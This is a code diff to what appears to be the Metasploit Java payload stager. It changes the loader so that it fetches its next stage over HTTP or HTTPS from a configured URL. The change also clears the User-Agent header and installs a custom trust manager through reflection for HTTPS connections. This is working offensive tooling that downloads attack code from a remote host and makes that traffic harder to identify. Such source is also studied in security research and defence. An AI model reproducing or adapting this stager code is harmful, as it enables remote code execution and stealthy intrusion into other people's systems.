@@ -183,17 +183,20 @@ public class Payload extends ClassLoader {
                 in = System.in;
                 out = System.out;
             } else if (url != null) {
-                if (url.startsWith("raw:"))
+                if (url.startsWith("raw:")) {
                     // for debugging: just use raw bytes from property file
                     in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
-                else if (url.startsWith("https:")) {
+                } else {
                     URLConnection uc = new URL(url).openConnection();
-                    // load the trust manager via reflection, to avoid loading
-                    // it when it is not needed (it requires Sun Java 1.4+)
-                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                    uc.setRequestProperty("User-Agent", null);
+                    if (url.startsWith("https:")) {
+                        // load the trust manager via reflection, to avoid loading
+                        // it when it is not needed (it requires Sun Java 1.4+)
+                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor",
+                            new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                    }
                     in = uc.getInputStream();
-                } else
-                    in = new URL(url).openStream();
+                }
                 out = new ByteArrayOutputStream();
             } else {
                 Socket socket;
